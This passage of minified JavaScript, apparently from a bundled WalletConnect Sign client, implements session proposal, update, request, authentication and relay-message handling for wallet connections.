this.client.proposal.delete(a,Vi("USER_DISCONNECTED")),await this.client.core.pairing.activate({topic:p}),await this.setExpiry(k,bs(fm)),{topic:k,acknowledged:()=>Promise.resolve(this.client.session.get(k))}}),qe(this,"reject",async t=>{this.isInitialized(),await this.confirmOnlineStateOrThrow();try{await this.isValidReject(t)}catch(o){throw this.client.logger.error("reject() -> isValidReject() failed"),o}const{id:i,reason:n}=t;let s;try{s=this.client.proposal.get(i).pairingTopic}catch(o){throw this.client.logger.error(`reject() -> proposal.get(${i}) failed`),o}s&&(await this.sendError({id:i,topic:s,error:n,rpcOpts:Os.wc_sessionPropose.reject}),await this.client.proposal.delete(i,Vi("USER_DISCONNECTED")))}),qe(this,"update",async t=>{this.isInitialized(),await this.confirmOnlineStateOrThrow();try{await this.isValidUpdate(t)}catch(d){throw this.client.logger.error("update() -> isValidUpdate() failed"),d}const{topic:i,namespaces:n}=t,{done:s,resolve:o,reject:a}=n1(),c=mn(),l=Cs().toString(),u=this.client.session.get(i).namespaces;return this.events.once(Pi("session_update",c),({error:d})=>{d?a(d):o()}),await this.client.session.update(i,{namespaces:n}),await this.sendRequest({topic:i,method:"wc_sessionUpdate",params:{namespaces:n},throwOnFailedPublish:!0,clientRpcId:c,relayRpcId:l}).catch(d=>{this.client.logger.error(d),this.client.session.update(i,{namespaces:u}),a(d)}),{acknowledged:s}}),qe(this,"extend",async t=>{this.isInitialized(),await this.confirmOnlineStateOrThrow();try{await this.isValidExtend(t)}catch(c){throw this.client.logger.error("extend() -> isValidExtend() failed"),c}const{topic:i}=t,n=mn(),{done:s,resolve:o,reject:a}=n1();return this.events.once(Pi("session_extend",n),({error:c})=>{c?a(c):o()}),await this.setExpiry(i,bs(fm)),this.sendRequest({topic:i,method:"wc_sessionExtend",params:{},clientRpcId:n,throwOnFailedPublish:!0}).catch(c=>{a(c)}),{acknowledged:s}}),qe(this,"request",async t=>{this.isInitialized();try{await this.isValidRequest(t)}catch(m){throw this.client.logger.error("request() -> isValidRequest() failed"),m}const{chainId:i,request:n,topic:s,expiry:o=Os.wc_sessionRequest.req.ttl}=t,a=this.client.session.get(s);a?.transportType===pn.relay&&await this.confirmOnlineStateOrThrow();const c=mn(),l=Cs().toString(),{done:u,resolve:d,reject:h}=n1(o,"Request expired. Please try again.");this.events.once(Pi("session_request",c),({error:m,result:x})=>{m?h(m):d(x)});const f="wc_sessionRequest",p=this.getAppLinkIfEnabled(a.peer.metadata,a.transportType);if(p)return await this.sendRequest({clientRpcId:c,relayRpcId:l,topic:s,method:f,params:{request:zo(Qi({},n),{expiryTimestamp:bs(o)}),chainId:i},expiry:o,throwOnFailedPublish:!0,appLink:p}).catch(m=>h(m)),this.client.events.emit("session_request_sent",{topic:s,request:n,chainId:i,id:c}),await u();const g={request:zo(Qi({},n),{expiryTimestamp:bs(o)}),chainId:i},w=this.shouldSetTVF(f,g);return await Promise.all([new Promise(async m=>{await this.sendRequest(Qi({clientRpcId:c,relayRpcId:l,topic:s,method:f,params:g,expiry:o,throwOnFailedPublish:!0},w&&{tvf:this.getTVFParams(c,g)})).catch(x=>h(x)),this.client.events.emit("session_request_sent",{topic:s,request:n,chainId:i,id:c}),m()}),new Promise(async m=>{var x;if(!((x=a.sessionConfig)!=null&&x.disableDeepLink)){const S=await $rt(this.client.core.storage,_G);await krt({id:c,topic:s,wcDeepLink:S})}m()}),u()]).then(m=>m[2])}),qe(this,"respond",async t=>{this.isInitialized(),await this.isValidRespond(t);const{topic:i,response:n}=t,{id:s}=n,o=this.client.session.get(i);o.transportType===pn.relay&&await this.confirmOnlineStateOrThrow();const a=this.getAppLinkIfEnabled(o.peer.metadata,o.transportType);Gi(n)?await this.sendResult({id:s,topic:i,result:n.result,throwOnFailedPublish:!0,appLink:a}):wi(n)&&await this.sendError({id:s,topic:i,error:n.error,appLink:a}),this.cleanupAfterResponse(t)}),qe(this,"ping",async t=>{this.isInitialized(),await this.confirmOnlineStateOrThrow();try{await this.isValidPing(t)}catch(n){throw this.client.logger.error("ping() -> isValidPing() failed"),n}const{topic:i}=t;if(this.client.session.keys.includes(i)){const n=mn(),s=Cs().toString(),{done:o,resolve:a,reject:c}=n1();this.events.once(Pi("session_ping",n),({error:l})=>{l?c(l):a()}),await Promise.all([this.sendRequest({topic:i,method:"wc_sessionPing",params:{},throwOnFailedPublish:!0,clientRpcId:n,relayRpcId:s}),o()])}else this.client.core.pairing.pairings.keys.includes(i)&&(this.client.logger.warn("ping() on pairing topic is deprecated and will be removed in the next major release."),await this.client.core.pairing.ping({topic:i}))}),qe(this,"emit",async t=>{this.isInitialized(),await this.confirmOnlineStateOrThrow(),await this.isValidEmit(t);const{topic:i,event:n,chainId:s}=t,o=Cs().toString(),a=mn();await this.sendRequest({topic:i,method:"wc_sessionEvent",params:{event:n,chainId:s},throwOnFailedPublish:!0,relayRpcId:o,clientRpcId:a})}),qe(this,"disconnect",async t=>{this.isInitialized(),await this.confirmOnlineStateOrThrow(),await this.isValidDisconnect(t);const{topic:i}=t;if(this.client.session.keys.includes(i))await this.sendRequest({topic:i,method:"wc_sessionDelete",params:Vi("USER_DISCONNECTED"),throwOnFailedPublish:!0}),await this.deleteSession({topic:i,emitEvent:!1});else if(this.client.core.pairing.pairings.keys.includes(i))await this.client.core.pairing.disconnect({topic:i});else{const{message:n}=at("MISMATCHED_TOPIC",`Session or pairing topic not found: ${i}`);throw new Error(n)}}),qe(this,"find",t=>(this.isInitialized(),this.client.session.getAll().filter(i=>Cst(i,t)))),qe(this,"getPendingSessionRequests",()=>this.client.pendingRequest.getAll()),qe(this,"authenticate",async(t,i)=>{var n;this.isInitialized(),this.isValidAuthenticate(t);const s=i&&this.client.core.linkModeSupportedApps.includes(i)&&((n=this.client.metadata.redirect)==null?void 0:n.linkMode),o=s?pn.link_mode:pn.relay;o===pn.relay&&await this.confirmOnlineStateOrThrow();const{chains:a,statement:c="",uri:l,domain:u,nonce:d,type:h,exp:f,nbf:p,methods:g=[],expiry:w}=t,m=[...t.resources||[]],{topic:x,uri:S}=await this.client.core.pairing.create({methods:["wc_sessionAuthenticate"],transportType:o});this.client.logger.info({message:"Generated new pairing",pairing:{topic:x,uri:S}});const T=await this.client.core.crypto.generateKeyPair(),k=T9(T);if(await Promise.all([this.client.auth.authKeys.set(N9,{responseTopic:k,publicKey:T}),this.client.auth.pairingTopics.set(k,{topic:k,pairingTopic:x})]),await this.client.core.relayer.subscribe(k,{transportType:o}),this.client.logger.info(`sending request to new pairing topic: ${x}`),g.length>0){const{namespace:R}=hw(a[0]);let P=_it(R,"request",g);I9(m)&&(P=Ait(P,m.pop())),m.push(P)}const I=w&&w>Os.wc_sessionAuthenticate.req.ttl?w:Os.wc_sessionAuthenticate.req.ttl,E={authPayload:{type:h??"caip122",chains:a,statement:c,aud:l,domain:u,version:"1",nonce:d,iat:new Date().toISOString(),exp:f,nbf:p,resources:m},requester:{publicKey:T,metadata:this.client.metadata},expiryTimestamp:bs(I)},C={eip155:{chains:a,methods:[...new Set(["personal_sign",...g])],events:["chainChanged","accountsChanged"]}},N={requiredNamespaces:{},optionalNamespaces:C,relays:[{protocol:"irn"}],pairingTopic:x,proposer:{publicKey:T,metadata:this.client.metadata},expiryTimestamp:bs(Os.wc_sessionPropose.req.ttl),id:mn()},{done:L,resolve:$,reject:y}=n1(I,"Request expired"),A=mn(),b=Pi("session_connect",N.id),v=Pi("session_request",A),_=async({error:R,session:P})=>{this.events.off(v,O),R?y(R):P&&$({session:P})},O=async R=>{var P,B,M;if(await this.deletePendingAuthRequest(A,{message:"fulfilled",code:0}),R.error){const U=Vi("WC_METHOD_UNSUPPORTED","wc_sessionAuthenticate");return R.error.code===U.code?void 0:(this.events.off(b,_),y(R.error.message))}await this.deleteProposal(N.id),this.events.off(b,_);const{cacaos:W,responder:K}=R.result,q=[],J=[];for(const U of W){await xK({cacao:U,projectId:this.client.core.projectId})||(this.client.logger.error(U,"Signature verification failed"),y(Vi("SESSION_SETTLEMENT_FAILED","Signature verification failed")));const{p:G}=U,Z=I9(G.resources),j=[AP(G.iss)],Y=ax(G.iss);if(Z){const se=CK(Z),ne=EK(Z);q.push(...se),j.push(...ne)}for(const se of j)J.push(`${se}:${Y}`)}const le=await this.client.core.crypto.generateSharedKey(T,K.publicKey);let ae;q.length>0&&(ae={topic:le,acknowledged:!0,self:{publicKey:T,metadata:this.client.metadata},peer:K,controller:K.publicKey,expiry:bs(fm),requiredNamespaces:{},optionalNamespaces:{},relay:{protocol:"irn"},pairingTopic:x,namespaces:GK([...new Set(q)],[...new Set(J)]),transportType:o},await this.client.core.relayer.subscribe(le,{transportType:o}),await this.client.session.set(le,ae),x&&await this.client.core.pairing.updateMetadata({topic:x,metadata:K.metadata}),ae=this.client.session.get(le)),(P=this.client.metadata.redirect)!=null&&P.linkMode&&(B=K.metadata.redirect)!=null&&B.linkMode&&(M=K.metadata.redirect)!=null&&M.universal&&i&&(this.client.core.addLinkModeSupportedApp(K.metadata.redirect.universal),this.client.session.update(le,{transportType:pn.link_mode})),$({auths:W,session:ae})};this.events.once(b,_),this.events.once(v,O);let D;try{if(s){const R=jn("wc_sessionAuthenticate",E,A);this.client.core.history.set(x,R);const P=await this.client.core.crypto.encode("",R,{type:o6,encoding:kf});D=$8(i,x,P)}else await Promise.all([this.sendRequest({topic:x,method:"wc_sessionAuthenticate",params:E,expiry:t.expiry,throwOnFailedPublish:!0,clientRpcId:A}),this.sendRequest({topic:x,method:"wc_sessionPropose",params:N,expiry:Os.wc_sessionPropose.req.ttl,throwOnFailedPublish:!0,clientRpcId:N.id})])}catch(R){throw this.events.off(b,_),this.events.off(v,O),R}return await this.setProposal(N.id,N),await this.setAuthRequest(A,{request:zo(Qi({},E),{verifyContext:{}}),pairingTopic:x,transportType:o}),{uri:D??S,response:L}}),qe(this,"approveSessionAuthenticate",async t=>{const{id:i,auths:n}=t,s=this.client.core.eventClient.createEvent({properties:{topic:i.toString(),trace:[Jp.authenticated_session_approve_started]}});try{this.isInitialized()}catch(w){throw s.setError(Kb.no_internet_connection),w}const o=this.getPendingAuthRequest(i);if(!o)throw s.setError(Kb.authenticated_session_pending_request_not_found),new Error(`Could not find pending auth request with id ${i}`);const a=o.transportType||pn.relay;a===pn.relay&&await this.confirmOnlineStateOrThrow();const c=o.requester.publicKey,l=await this.client.core.crypto.generateKeyPair(),u=T9(c),d={type:s0,receiverPublicKey:c,senderPublicKey:l},h=[],f=[];for(const w of n){if(!await xK({cacao:w,projectId:this.client.core.projectId})){s.setError(Kb.invalid_cacao);const k=Vi("SESSION_SETTLEMENT_FAILED","Signature verification failed");throw await this.sendError({id:i,topic:u,error:k,encodeOpts:d}),new Error(k.message)}s.addTrace(Jp.cacaos_verified);const{p:m}=w,x=I9(m.resources),S=[AP(m.iss)],T=ax(m.iss);if(x){const k=CK(x),I=EK(x);h.push(...k),S.push(...I)}for(const k of S)f.push(`${k}:${T}`)}const p=await this.client.core.crypto.generateSharedKey(l,c);s.addTrace(Jp.create_authenticated_session_topic);let g;if(h?.length>0){g={topic:p,acknowledged:!0,self:{publicKey:l,metadata:this.client.metadata},peer:{publicKey:c,metadata:o.requester.metadata},controller:c,expiry:bs(fm),authentication:n,requiredNamespaces:{},optionalNamespaces:{},relay:{protocol:"irn"},pairingTopic:o.pairingTopic,namespaces:GK([...new Set(h)],[...new Set(f)]),transportType:a},s.addTrace(Jp.subscribing_authenticated_session_topic);try{await this.client.core.relayer.subscribe(p,{transportType:a})}catch(w){throw s.setError(Kb.subscribe_authenticated_session_topic_failure),w}s.addTrace(Jp.subscribe_authenticated_session_topic_success),await this.client.session.set(p,g),s.addTrace(Jp.store_authenticated_session),await this.client.core.pairing.updateMetadata({topic:o.pairingTopic,metadata:o.requester.metadata})}s.addTrace(Jp.publishing_authenticated_session_approve);try{await this.sendResult({topic:u,id:i,result:{cacaos:n,responder:{publicKey:l,metadata:this.client.metadata}},encodeOpts:d,throwOnFailedPublish:!0,appLink:this.getAppLinkIfEnabled(o.requester.metadata,a)})}catch(w){throw s.setError(Kb.authenticated_session_approve_publish_failure),w}return await this.client.auth.requests.delete(i,{message:"fulfilled",code:0}),await this.client.core.pairing.activate({topic:o.pairingTopic}),this.client.core.eventClient.deleteEvent({eventId:s.eventId}),{session:g}}),qe(this,"rejectSessionAuthenticate",async t=>{this.isInitialized();const{id:i,reason:n}=t,s=this.getPendingAuthRequest(i);if(!s)throw new Error(`Could not find pending auth request with id ${i}`);s.transportType===pn.relay&&await this.confirmOnlineStateOrThrow();const o=s.requester.publicKey,a=await this.client.core.crypto.generateKeyPair(),c=T9(o),l={type:s0,receiverPublicKey:o,senderPublicKey:a};await this.sendError({id:i,topic:c,error:n,encodeOpts:l,rpcOpts:Os.wc_sessionAuthenticate.reject,appLink:this.getAppLinkIfEnabled(s.requester.metadata,s.transportType)}),await this.client.auth.requests.delete(i,{message:"rejected",code:0}),await this.client.proposal.delete(i,Vi("USER_DISCONNECTED"))}),qe(this,"formatAuthMessage",t=>{this.isInitialized();const{request:i,iss:n}=t;return Yse(i,n)}),qe(this,"processRelayMessageCache",()=>{setTimeout(async()=>{if(this.relayMessageCache.length!==0)for(;this.relayMessageCache.length>0;)try{const t=this.relayMessageCache.shift();t&&await this.onRelayMessage(t)}catch(t){this.client.logger.error(t)}},50)}),qe(this,"cleanupDuplicatePairings",async t=>{if(t.pairingTopic)try{const i=this.client.core.pairing.pairings.get(t.pairingTopic),n=this.client.core.pairing.pairings.getAll().filter(s=>{var o,a;return((o=s.peerMetadata)==null?void 0:o.url)&&((a=s.peerMetadata)==null?void 0:a.url)===t.peer.metadata.url&&s.topic&&s.topic!==i.topic});if(n.length===0)return;this.client.logger.info(`Cleaning up ${n.length} duplicate pairing(s)`),await Promise.all(n.map(s=>this.client.core.pairing.disconnect({topic:s.topic}))),this.client.logger.info("Duplicate pairings clean up finished")}catch(i){this.client.logger.error(i)}}),qe(this,"deleteSession",async t=>{var i;const{topic:n,expirerHasDeleted:s=!1,emitEvent:o=!0,id:a=0}=t,{self:c}=this.client.session.get(n);await this.client.core.relayer.unsubscribe(n),await this.client.session.delete(n,Vi("USER_DISCONNECTED")),this.addToRecentlyDeleted(n,"session"),this.client.core.crypto.keychain.has(c.publicKey)&&await this.client.core.crypto.deleteKeyPair(c.publicKey),this.client.core.crypto.keychain.has(n)&&await this.client.core.crypto.deleteSymKey(n),s||this.client.core.expirer.del(n),this.client.core.storage.removeItem(_G).catch(l=>this.client.logger.warn(l)),this.getPendingSessionRequests().forEach(l=>{l.topic===n&&this.deletePendingSessionRequest(l.id,Vi("USER_DISCONNECTED"))}),n===((i=this.sessionRequestQueue.queue[0])==null?void 0:i.topic)&&(this.sessionRequestQueue.state=Qu.idle),o&&this.client.events.emit("session_delete",{id:a,topic:n})}),qe(this,"deleteProposal",async(t,i)=>{if(i)try{const n=this.client.proposal.get(t);this.client.core.eventClient.getEvent({topic:n.pairingTopic})?.setError(Yp.proposal_expired)}catch{}await Promise.all([this.client.proposal.delete(t,Vi("USER_DISCONNECTED")),i?Promise.resolve():this.client.core.expirer.del(t)]),this.addToRecentlyDeleted(t,"proposal")}),qe(this,"deletePendingSessionRequest",async(t,i,n=!1)=>{await Promise.all([this.client.pendingRequest.delete(t,i),n?Promise.resolve():this.client.core.expirer.del(t)]),this.addToRecentlyDeleted(t,"request"),this.sessionRequestQueue.queue=this.sessionRequestQueue.queue.filter(s=>s.id!==t),n&&(this.sessionRequestQueue.state=Qu.idle,this.client.events.emit("session_request_expire",{id:t}))}),qe(this,"deletePendingAuthRequest",async(t,i,n=!1)=>{await Promise.all([this.client.auth.requests.delete(t,i),n?Promise.resolve():this.client.core.expirer.del(t)])}),qe(this,"setExpiry",async(t,i)=>{this.client.session.keys.includes(t)&&(this.client.core.expirer.set(t,i),await this.client.session.update(t,{expiry:i}))}),qe(this,"setProposal",async(t,i)=>{this.client.core.expirer.set(t,bs(Os.wc_sessionPropose.req.ttl)),await this.client.proposal.set(t,i)}),qe(this,"setAuthRequest",async(t,i)=>{const{request:n,pairingTopic:s,transportType:o=pn.relay}=i;this.client.core.expirer.set(t,n.expiryTimestamp),await this.client.auth.requests.set(t,{authPayload:n.authPayload,requester:n.requester,expiryTimestamp:n.expiryTimestamp,id:t,pairingTopic:s,verifyContext:n.verifyContext,transportType:o})}),qe(this,"setPendingSessionRequest",async t=>{const{id:i,topic:n,params:s,verifyContext:o}=t,a=s.request.expiryTimestamp||bs(Os.wc_sessionRequest.req.ttl);this.client.core.expirer.set(i,a),await this.client.pendingRequest.set(i,{id:i,topic:n,params:s,verifyContext:o})}),qe(this,"sendRequest",async t=>{const{topic:i,method:n,params:s,expiry:o,relayRpcId:a,clientRpcId:c,throwOnFailedPublish:l,appLink:u,tvf:d}=t,h=jn(n,s,c);let f;const p=!!u;try{const m=p?kf:uu;f=await this.client.core.crypto.encode(i,h,{encoding:m})}catch(m){throw await this.cleanup(),this.client.logger.error(`sendRequest() -> core.crypto.encode() for topic ${i} failed`),m}let g;if(Ult.includes(n)){const m=ld(JSON.stringify(h)),x=ld(f);g=await this.client.core.verify.register({id:x,decryptedId:m})}const w=Os[n].req;if(w.attestation=g,o&&(w.ttl=o),a&&(w.id=a),this.client.core.history.set(i,h),p){const m=$8(u,i,f);await global.Linking.openURL(m,this.client.name)}else{const m=Os[n].req;o&&(m.ttl=o),a&&(m.id=a),m.tvf=zo(Qi({},d),{correlationId:h.id}),l?(m.internal=zo(Qi({},m.internal),{throwOnFailedPublish:!0}),await this.client.core.relayer.publish(i,f,m)):this.client.core.relayer.publish(i,f,m).catch(x=>this.client.logger.error(x))}return h.id}),qe(this,"sendResult",async t=>{const{id:i,topic:n,result:s,throwOnFailedPublish:o,encodeOpts:a,appLink:c}=t,l=bl(i,s);let u;const d=c&&typeof(global==null?void 0:global.Linking)<"u";try{const p=d?kf:uu;u=await this.client.core.crypto.encode(n,l,zo(Qi({},a||{}),{encoding:p}))}catch(p){throw await this.cleanup(),this.client.logger.error(`sendResult() -> core.crypto.encode() for topic ${n} failed`),p}let h,f;try{h=await this.client.core.history.get(n,i);const p=h.request;try{this.shouldSetTVF(p.method,p.params)&&(f=this.getTVFParams(i,p.params,s))}catch(g){this.client.logger.warn("sendResult() -> getTVFParams() failed",g)}}catch(p){throw this.client.logger.error(`sendResult() -> history.get(${n}, ${i}) failed`),p}if(d){const p=$8(c,n,u);await global.Linking.openURL(p,this.client.name)}else{const p=h.request.method,g=Os[p].res;g.tvf=zo(Qi({},f),{correlationId:i}),o?(g.internal=zo(Qi({},g.internal),{throwOnFailedPublish:!0}),await this.client.core.relayer.publish(n,u,g)):this.client.core.relayer.publish(n,u,g).catch(w=>this.client.logger.error(w))}await this.client.core.history.resolve(l)}),qe(this,"sendError",async t=>{const{id:i,topic:n,error:s,encodeOpts:o,rpcOpts:a,appLink:c}=t,l=Ap(i,s);let u;const d=c&&typeof(global==null?void 0:global.Linking)<"u";try{const f=d?kf:uu;u=await this.client.core.crypto.encode(n,l,zo(Qi({},o||{}),{encoding:f}))}catch(f){throw await this.cleanup(),this.client.logger.error(`sendError() -> core.crypto.encode() for topic ${n} failed`),f}let h;try{h=await this.client.core.history.get(n,i)}catch(f){throw this.client.logger.error(`sendError() -> history.get(${n}, ${i}) failed`),f}if(d){const f=$8(c,n,u);await global.Linking.openURL(f,this.client.name)}else{const f=h.request.method,p=a||Os[f].res;this.client.core.relayer.publish(n,u,p)}await this.client.core.history.resolve(l)}),qe(this,"cleanup",async()=>{const t=[],i=[];this.client.session.getAll().forEach(n=>{let s=!1;Sf(n.expiry)&&(s=!0),this.client.core.crypto.keychain.has(n.topic)||(s=!0),s&&t.push(n.topic)}),this.client.proposal.getAll().forEach(n=>{Sf(n.expiryTimestamp)&&i.push(n.id)}),await Promise.all([...t.map(n=>this.deleteSession({topic:n})),...i.map(n=>this.deleteProposal(n))])}),qe(this,"onProviderMessageEvent",async t=>{!this.initialized||this.relayMessageCache.length>0?this.relayMessageCache.push(t):await this.onRelayMessage(t)}),qe(this,"onRelayEventRequest",async t=>{this.requestQueue.queue.push(t),await this.processRequestsQueue()}),qe(this,"processRequestsQueue",async()=>{if(this.requestQueue.state===Qu.active){this.client.logger.info("Request queue already active, skipping...");return}for(this.client.logger.info(`Request queue starting with ${this.requestQueue.queue.length} requests`);this.requestQueue.queue.length>0;){this.requestQueue.state=Qu.active;const t=this.requestQueue.queue.shift();if(t)try{await this.processRequest(t)}catch(i){this.client.logger.warn(i)}}this.requestQueue.state=Qu.idle}),qe(this,"processRequest",async t=>{const{topic:i,payload:n,attestation:s,transportType:o,encryptedId:a}=t,c=n.method;if(!this.shouldIgnorePairingRequest({topic:i,requestMethod:c}))switch(c){case"wc_sessionPropose":return await this.onSessionProposeRequest({topic:i,payload:n,attestation:s,encryptedId:a});case"wc_sessionSettle":return await this.onSessionSettleRequest(i,n);case"wc_sessionUpdate":return await this.onSessionUpdateRequest(i,n);case"wc_sessionExtend":return await this.onSessionExtendRequest(i,n);case"wc_sessionPing":return await this.onSessionPingRequest(i,n);case"wc_sessionDelete":return await this.onSessionDeleteRequest(i,n);case"wc_sessionRequest":return await this.onSessionRequest({topic:i,payload:n,attestation:s,encryptedId:a,transportType:o});case"wc_sessionEvent":return await this.onSessionEventRequest(i,n);case"wc_sessionAuthenticate":return await this.onSessionAuthenticateRequest({topic:i,payload:n,attestation:s,encryptedId:a,transportType:o});default:return this.client.logger.info(`Unsupported request method ${c}`)}}),qe(this,"onRelayEventResponse",async t=>{const{topic:i,payload:n,transportType:s}=t,o=(await this.client.core.history.get(i,n.id)).request.method;switch(o){case"wc_sessionPropose":return this.onSessionProposeResponse(i,n,s);case"wc_sessionSettle":return this.onSessionSettleResponse(i,n);case"wc_sessionUpdate":return this.onSessionUpdateResponse(i,n);case"wc_sessionExtend":return this.onSessionExtendResponse(i,n);case"wc_sessionPing":return this.onSessionPingResponse(i,n);case"wc_sessionRequest":return this.onSessionRequestResponse(i,n);case"wc_sessionAuthenticate":return this.onSessionAuthenticateResponse(i,n);default:return this.client.logger.info(`Unsupported response method ${o}`)}}),qe(this,"onRelayEventUnknownPayload",t=>{const{topic:i}=t,{message:n}=at("MISSING_OR_INVALID",`Decoded payload on topic ${i} is not identifiable as a JSON-RPC request or a response.`);throw new Error(n)}),qe(this,"shouldIgnorePairingRequest",t=>{const{topic:i,requestMethod:n}=t,s=this.expectedPairingMethodMap.get(i);return!s||s.includes(n)?!1:!!(s.includes("wc_sessionAuthenticate")&&this.client.events.listenerCount("session_authenticate")>0)}),qe(this,"onSessionProposeRequest",async t=>{const{topic:i,payload:n,attestation:s,encryptedId:o}=t,{params:a,id:c}=n;try{const l=this.client.core.eventClient.getEvent({topic:i});this.client.events.listenerCount("session_proposal")===0&&(console.warn("No listener for session_proposal event"),l?.setError(Oh.proposal_listener_not_found)),this.isValidConnect(Qi({},n.params));const u=a.expiryTimestamp||bs(Os.wc_sessionPropose.req.ttl),d=Qi({id:c,pairingTopic:i,expiryTimestamp:u},a);await this.setProposal(c,d);const h=await this.getVerifyContext({attestationId:s,hash:ld(JSON.stringify(n)),encryptedId:o,metadata:d.proposer.metadata});l?.addTrace(rd.emit_session_proposal),this.client.events.emit("session_proposal",{id:c,params:d,verifyContext:h})}catch(l){await this.sendError({id:c,topic:i,error:l,rpcOpts:Os.wc_sessionPropose.autoReject}),this.client.logger.error(l)}}),qe(this,"onSessionProposeResponse",async(t,i,n)=>{const{id:s}=i;if(Gi(i)){const{result:o}=i;this.client.logger.trace({type:"method",method:"onSessionProposeResponse",result:o});const a=this.client.proposal.get(s);this.client.logger.trace({type:"method",method:"onSessionProposeResponse",proposal:a});const c=a.proposer.publicKey;this.client.logger.trace({type:"method",method:"onSessionProposeResponse",selfPublicKey:c});const l=o.responderPublicKey;this.client.logger.trace({type:"method",method:"onSessionProposeResponse",peerPublicKey:l});const u=await this.client.core.crypto.generateSharedKey(c,l);this.pendingSessions.set(s,{sessionTopic:u,pairingTopic:t,proposalId:s,publicKey:c});const d=await this.client.core.relayer.subscribe(u,{transportType:n});this.client.logger.trace({type:"method",method:"onSessionProposeResponse",subscriptionId:d}),await this.client.core.pairing.activate({topic:t})}else if(wi(i)){await this.client.proposal.delete(s,Vi("USER_DISCONNECTED"));const o=Pi("session_connect",s);if(this.events.listenerCount(o)===0)throw new Error(`emitting ${o} without any listeners, 954`);this.events.emit(o,{error:i.error})}}),qe(this,"onSessionSettleRequest",async(t,i)=>{const{id:n,params:s}=i;try{this.isValidSessionSettleRequest(s);const{relay:o,controller:a,expiry:c,namespaces:l,sessionProperties:u,scopedProperties:d,sessionConfig:h}=i.params,f=[...this.pendingSessions.values()].find(w=>w.sessionTopic===t);if(!f)return this.client.logger.error(`Pending session not found for topic ${t}`);const p=this.client.proposal.get(f.proposalId),g=zo(Qi(Qi(Qi({topic:t,relay:o,expiry:c,namespaces:l,acknowledged:!0,pairingTopic:f.pairingTopic,requiredNamespaces:p.requiredNamespaces,optionalNamespaces:p.optionalNamespaces,controller:a.publicKey,self:{publicKey:f.publicKey,metadata:this.client.metadata},peer:{publicKey:a.publicKey,metadata:a.metadata}},u&&{sessionProperties:u}),d&&{scopedProperties:d}),h&&{sessionConfig:h}),{transportType:pn.relay});await this.client.session.set(g.topic,g),await this.setExpiry(g.topic,g.expiry),await this.client.core.pairing.updateMetadata({topic:f.pairingTopic,metadata:g.peer.metadata}),this.client.events.emit("session_connect",{session:g}),this.events.emit(Pi("session_connect",f.proposalId),{session:g}),this.pendingSessions.delete(f.proposalId),this.deleteProposal(f.proposalId,!1),this.cleanupDuplicatePairings(g),await this.sendResult({id:i.id,topic:t,result:!0,throwOnFailedPublish:!0})}catch(o){await this.sendError({id:n,topic:t,error:o}),this.client.logger.error(o)}}),qe(this,"onSessionSettleResponse",async(t,i)=>{const{id:n}=i;Gi(i)?(await this.client.session.update(t,{acknowledged:!0}),this.events.emit(Pi("session_approve",n),{})):wi(i)&&(await this.client.session.delete(t,Vi("USER_DISCONNECTED")),this.events.emit(Pi("session_approve",n),{error:i.error}))}),qe(this,"onSessionUpdateRequest",async(t,i)=>{const{params:n,id:s}=i;try{const o=`${t}_session_update`,a=Hb.get(o);if(a&&this.isRequestOutOfSync(a,s)){this.client.logger.warn(`Discarding out of sync request - ${s}`),this.sendError({id:s,topic:t,error:Vi("INVALID_UPDATE_REQUEST")});return}this.isValidUpdate(Qi({topic:t},n));try{Hb.set(o,s),await this.client.session.update(t,{namespaces:n.namespaces}),await this.sendResult({id:s,topic:t,result:!0,throwOnFailedPublish:!0})}catch(c){throw Hb.delete(o),c}this.client.events.emit("session_update",{id:s,topic:t,params:n})}catch(o){await this.sendError({id:s,topic:t,error:o}),this.client.logger.error(o)}}),qe(this,"isRequestOutOfSync",(t,i)=>i.toString().slice(0,-3)<t.toString().slice(0,-3)),qe(this,"onSessionUpdateResponse",(t,i)=>{const{id:n}=i,s=Pi("session_update",n);if(this.events.listenerCount(s)===0)throw new Error(`emitting ${s} without any listeners`);Gi(i)?this.events.emit(Pi("session_update",n),{}):wi(i)&&this.events.emit(Pi("session_update",n),{error:i.error})}),qe(this,"onSessionExtendRequest",async(t,i)=>{const{id:n}=i;try{this.isValidExtend({topic:t}),await this.setExpiry(t,bs(fm)),await this.sendResult({id:n,topic:t,result:!0,throwOnFailedPublish:!0}),this.client.events.emit("session_extend",{id:n,topic:t})}catch(s){await this.sendError({id:n,topic:t,error:s}),this.client.logger.error(s)}}),qe(this,"onSessionExtendResponse",(t,i)=>{const{id:n}=i,s=Pi("session_extend",n);if(this.events.listenerCount(s)===0)throw new Error(`emitting ${s} without any listeners`);Gi(i)?this.events.emit(Pi("session_extend",n),{}):wi(i)&&this.events.emit(Pi("session_extend",n),{error:i.error})}),qe(this,"onSessionPingRequest",async(t,i)=>{const{id:n}=i;try{this.isValidPing({topic:t}),await this.sendResult({id:n,topic:t,result:!0,throwOnFailedPublish:!0}),this.client.events.emit("session_ping",{id:n,topic:t})}catch(s){await this.sendError({id:n,topic:t,error:s}),this.client.logger.error(s)}}),qe(this,"onSessionPingResponse",(t,i)=>{const{id:n}=i,s=Pi("session_ping",n);setTimeout(()=>{if(this.events.listenerCount(s)===0)throw new Error(`emitting ${s} without any listeners 2176`);Gi(i)?this.events.emit(Pi("session_ping",n),{}):wi(i)&&this.events.emit(Pi("session_ping",n),{error:i.error})},500)}),qe(this,"onSessionDeleteRequest",async(t,i)=>{const{id:n}=i;try{this.isValidDisconnect({topic:t,reason:i.params}),Promise.all([new Promise(s=>{this.client.core.relayer.once(qs.publish,async()=>{s(await this.deleteSession({topic:t,id:n}))})}),this.sendResult({id:n,topic:t,result:!0,throwOnFailedPublish:!0}),this.cleanupPendingSentRequestsForTopic({topic:t,error:Vi("USER_DISCONNECTED")})]).catch(s=>this.client.logger.error(s))}catch(s){this.client.logger.error(s)}}),qe(this,"onSessionRequest",async t=>{var i,n,s;const{topic:o,payload:a,attestation:c,encryptedId:l,transportType:u}=t,{id:d,params:h}=a;try{await this.isValidRequest(Qi({topic:o},h));const f=this.client.session.get(o),p=await this.getVerifyContext({attestationId:c,hash:ld(JSON.stringify(jn("wc_sessionRequest",h,d))),encryptedId:l,metadata:f.peer.metadata,transportType:u}),g={id:d,topic:o,params:h,verifyContext:p};await this.setPendingSessionRequest(g),u===pn.link_mode&&(i=f.peer.metadata.redirect)!=null&&i.universal&&this.client.core.addLinkModeSupportedApp((n=f.peer.metadata.redirect)==null?void 0:n.universal),(s=this.client.signConfig)!=null&&s.disableRequestQueue?this.emitSessionRequest(g):(this.addSessionRequestToSessionRequestQueue(g),this.processSessionRequestQueue())}catch(f){await 